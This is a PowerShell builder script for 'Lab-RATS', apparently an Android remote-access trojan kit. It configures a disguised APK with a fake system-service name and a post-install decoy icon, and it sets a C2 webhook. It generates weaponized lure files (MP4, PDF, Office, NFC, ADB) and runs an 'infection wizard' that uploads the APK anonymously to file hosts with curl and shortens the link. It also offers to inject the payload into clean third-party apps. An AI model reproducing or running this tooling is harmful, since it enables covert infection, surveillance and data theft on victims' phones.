# ====================================================================
#                   Lab-RATS PowerShell Builder
#                         v1.6.0 Hardened
# ====================================================================
# Developed by K4N3CO © 2026

Param(
    [string]$TargetApk
)

$ErrorActionPreference = "Continue"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir
$ConfigFile = Join-Path $ScriptDir "build_config.txt"

function Write-Banner {
    Clear-Host
    Write-Host " ┌───────────────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
    Write-Host " │                                  .-         .                         │" -ForegroundColor Cyan
    Write-Host " │                               ....-        :                          │" -ForegroundColor Cyan
    Write-Host " │                            -==--+:.+. ..  -..+:-+                     │" -ForegroundColor Cyan
    Write-Host " │                            ++---:+.-==+==#:.+---+#                    │" -ForegroundColor Cyan
    Write-Host " │                             :=---:+++++=++=**-:-:                     │" -ForegroundColor Cyan
    Write-Host " │                               --+++:-=+++++++-=                       │" -ForegroundColor Cyan
    Write-Host " │                  .-.         :--+==:++-:-**+-+-                       │" -ForegroundColor Cyan
    Write-Host " │                    -.     .==:--+:+++=++++++++#.                      │" -ForegroundColor Cyan
    Write-Host " │                    :-    =---=::-++.=:.=.-==+....                     │" -ForegroundColor Cyan
    Write-Host " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │" -ForegroundColor Cyan
    Write-Host " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │" -ForegroundColor Cyan
    Write-Host " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │" -ForegroundColor Cyan
    Write-Host " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │" -ForegroundColor Cyan
    Write-Host " │                .-=:  .---=++++-++++#####*++..::--. .                  │" -ForegroundColor Cyan
    Write-Host " │                 .--++.--:----=+---=-++#++==.       .                  │" -ForegroundColor Cyan
    Write-Host " │                   --------=--:=:-:-====+++-                           │" -ForegroundColor Cyan
    Write-Host " │                       .--++++--++:+++==:=+.                           │" -ForegroundColor Cyan
    Write-Host " │                        .:+++::::--:..:-+=                             │" -ForegroundColor Cyan
    Write-Host " │                       .--=+=-+-+    -:---*---                         │" -ForegroundColor Cyan
    Write-Host " │                                                                       │" -ForegroundColor Cyan
    Write-Host " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │" -ForegroundColor Cyan
    Write-Host " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │" -ForegroundColor Cyan
    Write-Host " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │" -ForegroundColor Cyan
    Write-Host " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │" -ForegroundColor Cyan
    Write-Host " │                                                                       │" -ForegroundColor Cyan
    Write-Host " │     ----------> Android APK Builder | v1.6.0 Hardened <----------     │" -ForegroundColor Cyan
    Write-Host " │                                                                       │" -ForegroundColor Cyan
    Write-Host " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │" -ForegroundColor Cyan
    Write-Host " │                         DEVELOPED BY K4N3CO                           │" -ForegroundColor Cyan
    Write-Host " │                               © 2026                                  │" -ForegroundColor Cyan
    Write-Host " └───────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan
    Write-Host ""
}

function Test-Requirements {
    Write-Host "[*] Checking requirements..." -ForegroundColor Cyan

    if (-not (Get-Command java -ErrorAction SilentlyContinue)) {
        Write-Host "[!] Java JDK 17/21 is required." -ForegroundColor Red
        return $false
    }
    Write-Host "[✓] Java detected" -ForegroundColor Green

    $gradlewPath = Join-Path $ProjectDir "gradlew.bat"
    if (-not (Test-Path $gradlewPath)) {
        Write-Host "[!] gradlew.bat not found in $ProjectDir" -ForegroundColor Red
        return $false
    }
    Write-Host "[✓] Requirements satisfied" -ForegroundColor Green
    return $true
}

function New-Keystore([bool]$AutoMode = $false) {
    $keystorePath = Join-Path $ProjectDir "lab-rats-keystore.jks"
    if ((Test-Path $keystorePath) -and $AutoMode) { return }

    if (Test-Path $keystorePath) {
        Write-Host "[!] Keystore already exists." -ForegroundColor Yellow
        $choice = Read-Host "    Generate new keystore? (y/N)"
        if ($choice -notmatch "^[yY]") { return }
        Remove-Item $keystorePath -Force
    }

    Write-Host "[*] Keystore Configuration" -ForegroundColor Cyan
    $alias = Read-Host "    Key alias [lab-rats-key]"
    if ([string]::IsNullOrWhiteSpace($alias)) { $alias = "lab-rats-key" }
    $pass = Read-Host "    Password [lab-rats123]"
    if ([string]::IsNullOrWhiteSpace($pass)) { $pass = "lab-rats123" }

    & keytool -genkeypair -alias $alias -keyalg RSA -keysize 2048 -validity 9125 -keystore $keystorePath -storepass $pass -keypass $pass -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>$null

    $props = "storeFile=lab-rats-keystore.jks`nstorePassword=$pass`nkeyAlias=$alias`nkeyPassword=$pass"
    Set-Content (Join-Path $ProjectDir "keystore.properties") $props
    Write-Host "[✓] Keystore ready" -ForegroundColor Green
}

function Set-AppConfig {
    Write-Host "[*] App Configuration" -ForegroundColor Cyan
    $appName = Read-Host "    Enter App Name [System Stability Service]"
    if ([string]::IsNullOrWhiteSpace($appName)) { $appName = "System Stability Service" }

    $pkgName = Read-Host "    Enter Package ID [com.android.system.stability]"
    if ([string]::IsNullOrWhiteSpace($pkgName)) { $pkgName = "com.android.system.stability" }

    $randVer = "$((Get-Random -Min 1 -Max 5)).$((Get-Random -Min 0 -Max 10)).$((Get-Random -Min 0 -Max 10))"
    $verName = Read-Host "    Enter Version Name [$randVer]"
    if ([string]::IsNullOrWhiteSpace($verName)) { $verName = $randVer }

    $minSdk = Read-Host "    Enter Min SDK [21]"
    if ([string]::IsNullOrWhiteSpace($minSdk)) { $minSdk = "21" }

    Write-Host "`n[*] Decoy Identity Selection" -ForegroundColor Cyan
    Write-Host "    (The app logo will transform into your selection immediately after install on device)" -ForegroundColor Yellow
    Write-Host "    1. System Update (Gear)  2. Calculator"
    Write-Host "    3. Weather               4. Play Protect"
    Write-Host "    5. Lab-RATS Logo"
    $decoyChoice = Read-Host "    Choice (Default 1)"
    if ([string]::IsNullOrWhiteSpace($decoyChoice)) { $decoyChoice = "1" }

    # Update app/build.gradle
    $buildGradle = Join-Path $ProjectDir "app\build.gradle"
    if (Test-Path $buildGradle) {
        (Get-Content $buildGradle) -replace 'applicationId "[^"]*"', "applicationId ""$pkgName""" `
                                    -replace 'versionName ".*"', "versionName ""$verName""" `
                                    -replace 'minSdk [0-9]*', "minSdk $minSdk" | Set-Content $buildGradle
    }

    # Update strings.xml
    $stringsXml = Join-Path $ProjectDir "app\src\main\res\values\strings.xml"
    if (Test-Path $stringsXml) {
        (Get-Content $stringsXml) -replace '<string name="app_name">.*</string>', "<string name=""app_name"">$appName</string>" | Set-Content $stringsXml
    }

    # Save build_config.txt
    $configContent = "PKG_NAME=""$pkgName""" + "`n" + `
                     "APP_NAME=""$appName""" + "`n" + `
                     "VERSION_NAME=""$verName""" + "`n" + `
                     "MIN_SDK=""$minSdk""" + "`n" + `
                     "DECOY_CHOICE=""$decoyChoice"""
    Set-Content $ConfigFile $configContent

    # local.properties handling
    $localProps = Join-Path $ProjectDir "local.properties"
    $existingWebhook = ""
    if (Test-Path $localProps) {
        $lines = Get-Content $localProps
        foreach ($l in $lines) {
            if ($l -like "WEBHOOK_URL=*") { $existingWebhook = $l.Substring("WEBHOOK_URL=".Length) }
        }
    }

    if ($existingWebhook) {
        Write-Host "    Current Webhook URL: $existingWebhook" -ForegroundColor Yellow
        $webhookUrl = Read-Host "    Enter C2 Webhook URL [Press Enter to Keep Current]"
        if ([string]::IsNullOrWhiteSpace($webhookUrl)) { $webhookUrl = $existingWebhook }
    } else {
        $webhookUrl = Read-Host "    Enter C2 Webhook URL (Google Script or Render)"
    }

    $randKey = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })

    $newProps = @()
    if (Test-Path $localProps) {
        foreach ($line in Get-Content $localProps) {
            if ($line -notlike "WEBHOOK_URL=*" -and $line -notlike "DECOY_CHOICE=*" -and $line -notlike "ENCRYPTION_KEY=*") {
                $newProps += $line
            }
        }
    }
    $newProps += "WEBHOOK_URL=$webhookUrl"
    $newProps += "DECOY_CHOICE=$decoyChoice"
    $newProps += "ENCRYPTION_KEY=$randKey"
    Set-Content $localProps ($newProps -join "`n")

    # Generate dummy assets
    $sysAssetDir = Join-Path $ProjectDir "app\src\main\assets\sys"
    if (-not (Test-Path $sysAssetDir)) { New-Item -ItemType Directory -Force -Path $sysAssetDir | Out-Null }
    1..3 | ForEach-Object {
        $bytes = New-Object byte[] 512
        (New-Object System.Random).NextBytes($bytes)
        [System.IO.File]::WriteAllBytes((Join-Path $sysAssetDir "metadata_$_.dat"), $bytes)
    }

    Write-Host "[✓] App configuration saved" -ForegroundColor Green
}

function Build-Apk {
    Write-Banner
    Write-Host "[*] Initializing Build Engine..." -ForegroundColor Cyan

    Set-Location $ProjectDir
    & .\gradlew.bat assembleRelease --parallel

    $outputDir = Join-Path $ScriptDir "output"
    if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir | Out-Null }

    $apkPath = Join-Path $ProjectDir "app\build\outputs\apk\release\app-release.apk"
    if (Test-Path $apkPath) {
        Copy-Item $apkPath (Join-Path $outputDir "signed_v1.apk") -Force
        Write-Host "`n[✓] Success: apk-builder/output/signed_v1.apk" -ForegroundColor Green
    } else {
        Write-Host "`n[!] Build failed." -ForegroundColor Red
    }

    Set-Location $ScriptDir
    Read-Host "    Press Enter to continue..."
}

function New-ExploitStandalone([string]$Type, [string]$Url, [string]$Extra) {
    $exploitSrc = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
    $tempBin = Join-Path $ScriptDir "bin"
    if (-not (Test-Path $tempBin)) { New-Item -ItemType Directory -Path $tempBin | Out-Null }

    & javac -sourcepath (Join-Path $ProjectDir "app\src\main\java") -d $tempBin $exploitSrc 2>$null
    if ($LASTEXITCODE -eq 0) {
        $outDir = Join-Path $ScriptDir "output"
        if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
        Set-Location $outDir
        & java -cp $tempBin com.labs.labrats.exploits.ExploitLab $Type $Url $Extra
        Set-Location $ScriptDir
    } else {
        Write-Host "[!] Exploit compilation failed." -ForegroundColor Red
    }
}

function Show-ExploitLab {
    Write-Banner
    Write-Host "[>] Weaponized Payload Lab (Hardened Tier)" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "    1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite"
    Write-Host "    4. Dolby Audio       5. ADB Script      6. Bluetooth Push"
    Write-Host "    7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle"
    Write-Host "    10. Office Word      11. Office Excel   12. Ghost GIF"
    Write-Host "    13. Priv-App Magisk Module ZIP"
    Write-Host "    14. Return to Main Menu"
    Write-Host ""
    $e = Read-Host "    Choice [1]"
    if ([string]::IsNullOrWhiteSpace($e)) { $e = "1" }

    $c2Url = "http://127.0.0.1:8080"
    $localProps = Join-Path $ProjectDir "local.properties"
    if (Test-Path $localProps) {
        $props = Get-Content $localProps
        foreach ($line in $props) {
            if ($line -like "WEBHOOK_URL=*") {
                $val = $line.Substring("WEBHOOK_URL=".Length)
                if ($val) { $c2Url = $val }
            }
        }
    }

    switch ($e) {
        "1" { New-ExploitStandalone "mp4" $c2Url "" }
        "2" { $t = Read-Host "    Enter Title [URGENT_DOCUMENT]"; if (-not $t) { $t = "URGENT_DOCUMENT" }; New-ExploitStandalone "pdf" $c2Url $t }
        "3" { $s = Read-Host "    Enter Meeting Summary [Meeting_Invite]"; if (-not $s) { $s = "Meeting_Invite" }; New-ExploitStandalone "ics" $c2Url $s }
        "4" { New-ExploitStandalone "dolby" $c2Url "" }
        "5" { $ip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $c2Url $ip }
        "6" { New-ExploitStandalone "vcf" $c2Url "Android Update" }
        "7" { New-ExploitStandalone "ndef" $c2Url "uri" }
        "8" { New-ExploitStandalone "stego" $c2Url "" }
        "9" { New-ExploitStandalone "pwa" $c2Url "SystemUpdate" }
        "10" { New-ExploitStandalone "docx" $c2Url "Security_Audit" }
        "11" { New-ExploitStandalone "xlsx" $c2Url "Financial_Report" }
        "12" { New-ExploitStandalone "gif" $c2Url "" }
        "13" { New-ExploitStandalone "privapp" $c2Url "" }
        "14" { return }
    }
    Write-Host ""
    Read-Host "    Press Enter to return to Lab..."
    Show-ExploitLab
}

function Show-InfectionWizard {
    Write-Banner
    Write-Host "[>] STRATEGIC_INFECTION_WIZARD" -ForegroundColor Red
    Write-Host "    Step-by-step automated payload weaponization." -ForegroundColor Yellow
    Write-Host ""

    if (-not (Test-Requirements)) {
        Read-Host "Press Enter to return..." | Out-Null
        return
    }

    New-Keystore -AutoMode $true
    Set-AppConfig
    Build-Apk

    $signedApk = Join-Path $ScriptDir "output\signed_v1.apk"
    if (-not (Test-Path $signedApk)) {
        Write-Host "[!] Signed APK not found. Wizard aborted." -ForegroundColor Red
        Read-Host "Press Enter to return..." | Out-Null
        return
    }

    Write-Host "`n[HOSTING] Select strategy:" -ForegroundColor Cyan
    Write-Host "    1. Anonymous Cloud (Catbox / Multi-Cloud Fallback)" -ForegroundColor White
    Write-Host "    2. Direct IP (IPv6)" -ForegroundColor White
    Write-Host "    3. Custom / Pre-hosted Direct URL" -ForegroundColor White
    $h = Read-Host "    Choice"
    $downloadUrl = ""

    if ($h -eq "2") {
        $ip = Read-Host "    Target IPv6"
        $downloadUrl = "http://[$ip]:9191/download/Update.apk"
    } elseif ($h -eq "3") {
        $downloadUrl = Read-Host "    Enter pre-hosted URL"
    } else {
        Write-Host "[*] Uploading to Catbox.moe..." -ForegroundColor Yellow
        $resp = curl.exe -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "fileToUpload=@$signedApk" https://catbox.moe/user/api.php 2>$null
        if ($resp -notlike "http*") {
            Write-Host "[!] Catbox failed/unreachable. Trying Litterbox fallback..." -ForegroundColor Yellow
            $resp = curl.exe -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$signedApk" https://litterbox.catbox.moe/resources/internals/api.php 2>$null
        }
        if ($resp -notlike "http*") {
            Write-Host "[!] Litterbox failed/unreachable. Trying Tmpfiles.org fallback..." -ForegroundColor Yellow
            $json = curl.exe -sS --connect-timeout 5 --max-time 15 -F "file=@$signedApk" https://tmpfiles.org/api/v1/upload 2>$null
            if ($json -match '"url":"([^"]+)"') {
                $rawUrl = $matches[1]
                $resp = $rawUrl -replace "tmpfiles.org/", "tmpfiles.org/dl/"
            }
        }
        if ($resp -notlike "http*") {
            Write-Host "[!] Automated cloud uploads unreachable/failed on this network." -ForegroundColor Red
            $resp = Read-Host "    Enter custom / pre-hosted URL manually"
        }
        if ([string]::IsNullOrWhiteSpace($resp) -or $resp -notlike "http*") {
            Write-Host "[!] Invalid URL provided. Hosting aborted." -ForegroundColor Red
            Read-Host "Press Enter to return..." | Out-Null
            return
        }
        $downloadUrl = $resp
        Write-Host "[✓] Hosted: $downloadUrl" -ForegroundColor Green

        Write-Host "[*] Shortening delivery URL..." -ForegroundColor Yellow
        $short = curl.exe -s --connect-timeout 5 "https://is.gd/create.php?format=simple&url=$downloadUrl" 2>$null
        if ($short -like "http*") {
            $downloadUrl = $short
            Write-Host "[✓] Shortened: $downloadUrl" -ForegroundColor Green
        }
    }

    Write-Host "`n[WEAPONIZE] Select Vector:" -ForegroundColor Cyan
    Write-Host "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
    Write-Host "    4. Dolby Audio     5. ADB Script    6. Bluetooth Push"
    Write-Host "    7. NFC NDEF Tag    8. Stego Image   9. PWA Bundle"
    Write-Host "    10. Office Word    11. Office Excel 12. Ghost GIF"
    $v = Read-Host "    Choice"

    switch ($v) {
        "1" { New-ExploitStandalone "mp4" $downloadUrl "" }
        "2" { New-ExploitStandalone "pdf" $downloadUrl "Security_Audit" }
        "3" { New-ExploitStandalone "ics" $downloadUrl "Security_Sync" }
        "4" { New-ExploitStandalone "dolby" $downloadUrl "" }
        "5" { $tip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $downloadUrl $tip }
        "6" { New-ExploitStandalone "vcf" $downloadUrl "Android Update" }
        "7" { New-ExploitStandalone "ndef" $downloadUrl "uri" }
        "8" { New-ExploitStandalone "stego" $downloadUrl "" }
        "9" { New-ExploitStandalone "pwa" $downloadUrl "SystemUpdate" }
        "10" { New-ExploitStandalone "docx" $downloadUrl "Security_Patch" }
        "11" { New-ExploitStandalone "xlsx" $downloadUrl "Financial_Report" }
        "12" { New-ExploitStandalone "gif" $downloadUrl "" }
    }

    Write-Host "`nDEPLOYMENT PACKAGE READY: $downloadUrl" -ForegroundColor Green
    Read-Host "Press Enter to return..." | Out-Null
}

function Show-Help {
    Write-Banner
    Write-Host "COMMAND_DOCUMENTATION_V1.6.0" -ForegroundColor White
    Write-Host "------------------------------------------------------------"
    Write-Host "1. Start Build: Standard production flow."
    Write-Host "2. Keystore Only: Unique signing certificate."
    Write-Host "3. App Settings: Change ID, Name, and Version."
    Write-Host "4. Requirements: Check Java setup."
    Write-Host "5. Exploit Lab: Generate standalone tactical vectors."
    Write-Host "6. Infection Wizard: Full Build -> Host -> Weaponize."
    Write-Host "7. Smali Surgery: Inject Lab-RATS payload into clean 3rd-party APK."
    Write-Host "------------------------------------------------------------"
    Read-Host "    Press Enter to return..." | Out-Null
}

function Show-MainMenu {
    while ($true) {
        Write-Banner
        Write-Host "[>] Build Options:" -ForegroundColor Magenta
        Write-Host ""
        Write-Host "    1. Start Build (Configure & Build)"
        Write-Host "    2. Generate Keystore Only"
        Write-Host "    3. Configure App Settings Only"
        Write-Host "    4. Check Requirements"
        Write-Host "    5. Weaponized Payload Lab"
        Write-Host "    6. Generate Infection Chain Package (Wizard)"
        Write-Host "    7. Smali Surgery & APK Binder (Infect Clean APK)"
        Write-Host "    8. Help / Documentation"
        Write-Host "    9. Exit"
        Write-Host ""
        $choice = Read-Host "    Choice (Default 1)"
        if ([string]::IsNullOrWhiteSpace($choice)) { $choice = "1" }

        switch ($choice) {
            "1" { if (Test-Requirements) { New-Keystore; Set-AppConfig; Build-Apk } else { Read-Host "    Press Enter to return..." } }
            "2" { if (Test-Requirements) { New-Keystore; Read-Host "    Press Enter to return..." } else { Read-Host "    Press Enter to return..." } }
            "3" { Set-AppConfig; Read-Host "    Press Enter to return..." }
            "4" { Test-Requirements | Out-Null; Read-Host "    Press Enter to return..." | Out-Null }
            "5" { Show-ExploitLab }
            "6" { Show-InfectionWizard }
            "7" { & powershell -ExecutionPolicy Bypass -File (Join-Path $ScriptDir "bind.ps1"); Read-Host "    Press Enter to return..." }
            "8" { Show-Help }
            "9" { exit 0 }
        }

        $binPath = Join-Path $ScriptDir "bin"
        if (Test-Path $binPath) { Remove-Item $binPath -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

Show-MainMenu
